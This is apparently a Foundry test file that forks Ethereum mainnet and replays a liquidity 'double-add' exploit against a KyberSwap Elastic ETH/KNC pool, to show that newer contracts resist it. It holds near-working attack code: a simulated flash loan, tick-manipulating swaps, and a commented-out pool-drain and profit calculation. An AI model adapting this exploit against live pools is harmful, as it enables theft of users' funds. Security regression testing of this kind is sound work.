// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "helpers/Pretty.sol";
import "helpers/BitUtils.sol";


import "forge-std/interfaces/IERC20.sol";

import "src/interfaces/IPool.sol";
import "src/interfaces/periphery/IRouter.sol";
import "src/interfaces/periphery/IBasePositionManager.sol";
import {MathConstants as C} from 'src/libraries/MathConstants.sol';

import {FullMath} from 'src/libraries/FullMath.sol';
import "src/libraries/TickMath.sol";
import "src/libraries/QtyDeltaMath.sol";
import "src/libraries/SwapMath.sol";


struct Stats {
    int256 netToken0;
    int256 netToken1;
    uint256 token0Spent;
    uint256 token1Spent;
}

interface IWETH is IERC20 {
    function withdraw(uint wad) external;
}

contract KyberswapTest is Test {

    using stdStorage for StdStorage;

    using Pretty for uint256;
    using Pretty for int256;
    using Pretty for uint160;
    using Pretty for int160;
    using Pretty for uint128;
    using Pretty for int128;
    using Pretty for uint8;
    string API_ENDPOINT;

    address WETH_addr   = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address KNC_addr    = 0xdeFA4e8a7bcBA345F687a2f1456F5Edd9CE97202;

    IERC20 WETH = IWETH(WETH_addr);
    IERC20 KNC  = IERC20(KNC_addr);

    IPool ETH_KNC = IPool(0x1A262266364bDb34df4c1337AD5f8b9b57182251);

    IRouter router = IRouter(0xF9c2b5746c946EF883ab2660BbbB1f10A5bdeAb4);
    IBasePositionManager positionManager = IBasePositionManager(0xe222fBE074A436145b255442D919E4E3A6c6a480);

    bytes32 SQRTP_SLOT_INDEX = bytes32(uint256(3));
    bytes32 BASEL_SLOT_INDEX = bytes32(uint256(4));

    // Constants for the hack. Play around with these for greater or lesser draining of the pool
    uint256 INITIAL_TOKEN0 = 11_000e18;
    uint128 INITIAL_TOKEN1 = 1_000_000e18;
    int24   TARGET_TICK    = 40_000;
    uint256 HUGE_AMOUNT    = 1_000_000e18;
    uint160 TARGET_SQRTP   = TickMath.getSqrtRatioAtTick(TARGET_TICK);

    function setUp() public {
        API_ENDPOINT = vm.envString("EVMNET_FORK_URL");
        vm.createSelectFork(API_ENDPOINT, 18011695);
        WETH.approve(address(router), type(uint256).max);
        KNC.approve(address(router), type(uint256).max);
        WETH.approve(address(positionManager), type(uint256).max);
        KNC.approve(address(positionManager), type(uint256).max);
    }

    function testFailedHack() public {
        // Simulate flashloan
        deal(WETH_addr, address(this), INITIAL_TOKEN0);
        deal(KNC_addr, address(this), INITIAL_TOKEN1);

        performFailedHack();
    }

    function performFailedHack() internal {

        console.log("=================================================================");
        console.log("Test demonstrating new contracts are NOT vulnerable to double-add");
        console.log("=================================================================\n\n\n");

        Stats memory stats;
        uint256 marketPrice = token0InToken1(getSqrtP());
        logXwing();
        logPoolBalances("Initial ", marketPrice);

        int24 tickSpacing = ETH_KNC.tickDistance();

        stats.token1Spent = INITIAL_TOKEN1;
        {
        (,,uint256 amount0_0, uint256 amount1_0) = positionManager.mint(getMintParams(TARGET_TICK - tickSpacing, TARGET_TICK + tickSpacing, 0, INITIAL_TOKEN1 - 1));
        (,,uint256 amount0_1, uint256 amount1_1) = positionManager.mint(getMintParams(TARGET_TICK, TARGET_TICK + tickSpacing, 1, 1)); // Tick already needs to exist for this hack to work

        stats.netToken1 -= int256(amount1_0 + amount1_1);
        stats.netToken0 -= int256(amount0_0 + amount0_1);
        }

        {
        console.log("TARGET_SQRTP for tick %s = %s", vm.toString(TARGET_TICK), TARGET_SQRTP);
        uint256 wstETHBefore = WETH.balanceOf(address(this));
        uint256 token1ReceivedOnSwap = router.swapExactInputSingle(getExactInputSingleParams(HUGE_AMOUNT, TARGET_SQRTP, true));
        uint256 wstETHAfter = WETH.balanceOf(address(this));
        stats.token0Spent += wstETHBefore - wstETHAfter;
        stats.netToken1 += int256(token1ReceivedOnSwap);
        console.log("token0 actually swapped = %s", (wstETHBefore - wstETHAfter).pretty());
        stats.netToken0 -= int256(wstETHBefore - wstETHAfter);
        }

        logPoolState();
        console.log("--- Swap forwards ---");
        router.swapExactInputSingle(getExactInputSingleParams(1, false));
        logPoolState();
        console.log("--- Swap backwards again. Now nearestCurrentTick < currentTick. This is bad ---");

        // Binary search to find exact amount to swap back
        {
        uint256 snapshotId = vm.snapshot();
        uint256 low = 1;
        uint256 high = 10_000;

        while (low < high) {
          uint256 mid = (low + high)/2;
          vm.revertTo(snapshotId);
          snapshotId = vm.snapshot();
          router.swapExactInputSingle(getExactInputSingleParams(mid, true));
          uint160 _sqrtP = getSqrtP();
          if (_sqrtP < TARGET_SQRTP) { // swapped too much
            high = mid;
          } else if (_sqrtP > TARGET_SQRTP) {
            low = mid + 1;
          } else {
            break;
          }
        }

        if ( getCurrentTick() != TARGET_TICK ) {
            console.log("\n\n");
            console.log("********************************************");
            console.log("*** Double add of liquidity not possible ***");
            console.log("********************************************");
        }
        require(getCurrentTick() == TARGET_TICK);
        }


        // logPoolState();
        // console.log("----- Double liquidity hack beginning ----");

        // {
        // uint128 amountToken0ToAdd  = getToken0Balance()/2;
        // console.log("amountToken0ToAdd = %s", amountToken0ToAdd.pretty());
        // (,uint128 liqAdded,uint256 amount0_2,uint256 amount1_2) = positionManager.mint(getMintParams(TARGET_TICK, TARGET_TICK + 10, amountToken0ToAdd, 0));
        // console.log("liquidity added = %s", liqAdded.pretty());
        // console.log("--- Liquidity is added once ---");
        // stats.token0Spent += amount0_2;
        // stats.token1Spent += amount1_2;
        // stats.netToken0 -= int128(int256(amount0_2));
        // stats.netToken1 -= int128(int256(amount1_2));
        // }
        // logPoolState();

        // router.swapExactInputSingle(getExactInputSingleParams(1, false)); // cross the tick and get the double add
        // console.log("--- Liquidity is added twice! Uh oh! ---");
        // logPoolState();

        // logPoolBalances(marketPrice);
        // console.log("price (token1/token0) = %s", token0InToken1(getSqrtP()).pretty());
        // uint256 token1RequiredToDrain =  getToken0Balance() * token0InToken1(getSqrtP()) / 1e18 ;
        // console.log("token1RequiredToDrain = %s", token1RequiredToDrain.pretty());
        // uint256 token0Out = router.swapExactInputSingle(getExactInputSingleParams(token1RequiredToDrain, false)); // swap one-for-zero
        // stats.netToken1 -= int256(token1RequiredToDrain);
        // stats.netToken0 += int256(token0Out);
        // logPoolState();

        // {
        // int256 finalToken0Balance = int256(uint256(getToken0Balance()));
        // int256 finalToken1Balance = int256(uint256(getToken1Balance()));
        // int256 economicDamage = (initialToken0Balance - finalToken0Balance) * int256(marketPrice) / 1e18 + (initialToken1Balance - finalToken1Balance);
        // int256 initialValueInToken1 = initialToken0Balance * int256(marketPrice) / 1e18 + initialToken1Balance;
        // int256 economicDamagePercent = economicDamage * 100_000 / initialValueInToken1;

        // console.log("\n=== Summary ===\n");
        // logPoolBalances("Final ", marketPrice);
        // console.log("Initial cost {");
        // console.log("  token0 = %s", stats.token0Spent.pretty());
        // console.log("  token1 = %s", stats.token1Spent.pretty());
        // console.log("}");
        // console.log("token0 net = %s", stats.netToken0.pretty());
        // console.log("token1 net = %s", stats.netToken1.pretty());
        // console.log("Profit (in token1)", (stats.netToken0 * int256(marketPrice) / 1e18 + stats.netToken1).pretty());
        // console.log("Economic damage (in token1) = %s", economicDamage.pretty());
        // console.log("Economic damage (as percent) = %s%%", economicDamagePercent.pretty(3));
        // }
    }

    /********** HELPERS ***********/

    function totalValue(uint160 marketPrice, uint256 amount0, uint256 amount1) internal view returns (uint256) {
        return amount0 * token0InToken1(marketPrice) / 1e18 + amount1;
    }

    function totalValue(uint160 marketPrice, int256 amount0, int256 amount1) internal view returns (uint256) {
        require(amount0 > 0 && amount1 > 0);
        return totalValue(marketPrice, uint256(amount0), uint256(amount1));
    }

    function logPoolBalances(uint256 marketPrice) internal view {
        logPoolBalances("", marketPrice);
    }

    function logPoolBalances(string memory prefix, uint256 marketPrice) internal view {
        uint256 token0Bal = getToken0Balance();
        uint256 token1Bal = getToken1Balance();
        console.log("%sPool Balances {", prefix);
        console.log("  token0Bal                   = %s", token0Bal.pretty());
        console.log("  token1Bal                   = %s", token1Bal.pretty());
        console.log("  marketPrice (token1/token0) = %s", marketPrice.pretty());
        uint256 token1Value = token0Bal * marketPrice / 1e18 + token1Bal;
        console.log("  Total value (in token1)     = %s", token1Value.pretty());
        console.log("}");
    }

    function getToken0Balance() internal view returns (uint128) {
        return uint128(ETH_KNC.token0().balanceOf(address(ETH_KNC)));
    }

    function getToken1Balance() internal view returns (uint128) {
        return uint128(ETH_KNC.token1().balanceOf(address(ETH_KNC)));
    }

    function logPoolState() internal view {
        (uint160 sqrtP,int24 currentTick,int24 nearestCurrentTick,) = ETH_KNC.getPoolState();
        (uint128 baseL,,) = ETH_KNC.getLiquidityState();
        console.log("PoolState {");
        console.log("  sqrtP              = %s", sqrtP.pretty());
        console.log("  currentTick        = %s", vm.toString(currentTick));
        console.log("  nearestCurrentTick = %s", vm.toString(nearestCurrentTick));
        console.log("  baseL              = %s", baseL.pretty());
        console.log("}");
    }

    function logTick(int24 tick) internal view {
      (uint128 liquidityGross,int128 liquidityNet,,) = ETH_KNC.ticks(tick);
      console.log("Tick %s {", vm.toString(tick));
      console.log("  liquidityGross = %s", liquidityGross.pretty());
      console.log("  liquidityNet   = %s", liquidityNet.pretty());
      console.log("}");
    }

    function token1InToken0(int24 tick) internal view returns (uint256) {
        return token1InToken0(TickMath.getSqrtRatioAtTick(tick));
    }

    function token1InToken0(uint160 price) internal view returns (uint256) {
        return 10**(KNC.decimals() + WETH.decimals()) / token0InToken1(price);
    }

    function token0InToken1(int24 tick) internal view returns (uint256) {
        return token0InToken1(TickMath.getSqrtRatioAtTick(tick));
    }

    function token0InToken1(uint160 price) internal view returns (uint256) {
        uint256 squarePrice = ((uint256(price) >> 32) * price)  >> 160;
        return 10**(18 + WETH.decimals() - KNC.decimals()) * squarePrice;
    }

    function getSqrtP() internal view returns (uint160) {
        (uint160 sqrtP,,,) = ETH_KNC.getPoolState();
        return sqrtP;
    }

    function getCurrentTick() internal view returns (int24) {
        (,int24 currentTick,,) = ETH_KNC.getPoolState();
        return currentTick;
    }

    function getNearestCurrentTick() internal view returns (int24) {
        (,,int24 nearestCurrentTick,) = ETH_KNC.getPoolState();
        return nearestCurrentTick;
    }

    function getLiquidity() internal view returns (uint128) {
        (uint128 baseL,,) = ETH_KNC.getLiquidityState();
        return baseL;
    }

    function setLiquidity(uint128 liquidity) internal {
        setSlotBitRange(BASEL_SLOT_INDEX, 0, 128, uint256(liquidity));
    }

    function setSqrtP(uint160 sqrtP) internal {
        setSlotBitRange(SQRTP_SLOT_INDEX, 0, 160, uint256(sqrtP));
    }

    function setCurrentTick(int24 currentTick) internal {
        setSlotBitRange(SQRTP_SLOT_INDEX, 184, 24, uint256(uint24(currentTick)));
    }

    function setNearestCurrentTick(int24 nearestCurrentTick) internal {
        setSlotBitRange(SQRTP_SLOT_INDEX, 160, 24, uint256(uint24(nearestCurrentTick)));
    }

    /* TODO: Factor these out into a Foundry extension library */

    function getSlotBitRange(bytes32 slotIndex, uint8 start, uint16 length) internal view returns (uint256) {
        return BitUtils.getBitRange(vm.load(address(ETH_KNC), slotIndex), start, length);
    }

    function setSlotBitRange(bytes32 slotIndex, uint8 start, uint16 length, uint256 value) internal {
        bytes32 slot = vm.load(address(ETH_KNC), slotIndex);
        vm.store(address(ETH_KNC), slotIndex, BitUtils.setBitRange(slot, start,length, value));
    }

    function incSlot(bytes32 slot, uint256 n) internal pure returns (bytes32) {
        return bytes32(uint256(slot) + n);
    }

    function storeOffset(address addr, bytes32 slot, uint256 offset, bytes32 value) internal {
        vm.store(addr, bytes32(uint256(slot) + offset), value);
    }

    function getReachAmount(uint160 targetSqrtP) internal view returns (uint256) {
        uint160 sqrtP = getSqrtP();
        uint128 liquidity = getLiquidity();
        uint256 numerator = FullMath.mulDivFloor(
          liquidity,
          sqrtP - targetSqrtP,
          sqrtP
        );
        return FullMath.mulDivFloor(numerator, C.TWO_POW_96, sqrtP);
    }

    function getExactInputSingleParams(uint256 amount, bool zeroForOne) internal view returns (IRouter.ExactInputSingleParams memory) {
        return getExactInputSingleParams(amount, 0, zeroForOne);
    }

    function getExactInputSingleParams(uint256 amount, uint160 limitSqrtP, bool zeroForOne) internal view returns (IRouter.ExactInputSingleParams memory) {
        IRouter.ExactInputSingleParams memory params =
          IRouter.ExactInputSingleParams(
            zeroForOne ? WETH_addr : KNC_addr ,
            zeroForOne ? KNC_addr  : WETH_addr,
            ETH_KNC.swapFeeUnits(),
            address(this),
            block.timestamp + 86400,
            amount,
            0,
            limitSqrtP
          );
        return params;
    }

    function getMintParams(int24 lowerTick, int24 upperTick, uint128 amount0, uint128 amount1) internal view returns (IBasePositionManager.MintParams memory) {
        int24[2] memory ticksPrevious;

        ticksPrevious[0] = findFirstInitializedTickLessThan(lowerTick);
        ticksPrevious[1] = findFirstInitializedTickLessThan(upperTick);

        return IBasePositionManager.MintParams(
            WETH_addr,
            KNC_addr,
            ETH_KNC.swapFeeUnits(),
            lowerTick,
            upperTick,
            ticksPrevious,
            amount0,
            amount1,
            0,
            0,
            address(this),
            block.timestamp + 86400
        );
    }

    function findFirstInitializedTickLessThan(int24 tick) internal view returns (int24) {
        int24 t = getNearestCurrentTick();
        while (t > tick) {
          (t, ) = ETH_KNC.initializedTicks(t);
        }
        return t;
    }


    function logXwing() internal view {
      console.log(".-.__        .-.  ___ ");
      console.log("|_|  '--.-.-(   \\/\\;;\\_ .-._______.-. ");
      console.log("(-)___     \\ \\ .-\\ \\;;\\(   \\       \\ \\ ");
      console.log(" Y    '---._\\_((Q)) \\;;\\\\ .-\\     __(_) ");
      console.log(" I           __'-' / .--.((Q))---'    \\, ");
      console.log(" I     ___.-:    \\|  |   \\'-'_          \\ ");
      console.log(" A  .-'      \\ .-.\\   \\   \\ \\ '--.__     '\\ ");
      console.log(" |  |____.----((Q))\\   \\__|--\\_      \\     ' ");
      console.log("    ( )        '-'  \\_  :  \\-' '--.___\\ ");
      console.log("     Y                \\  \\  \\       \\(_) ");
      console.log("     I                 \\  \\  \\         \\, ");
      console.log("     I                  \\  \\  \\          \\ ");
      console.log("     A                   \\  \\  \\          '\\ ");
      console.log("     |                    \\  \\__|           ' ");
      console.log("                           \\_:.  \\ ");
      console.log("                             \\ \\  \\ ");
      console.log("                              \\ \\  \\ ");
      console.log("                               \\_\\_| ");
      console.log("\n\n");
      console.log("      *** SETTING UP FOR OUR ATTACK RUN ***");
      console.log("\n\n");
    }

    receive() external payable {}

}
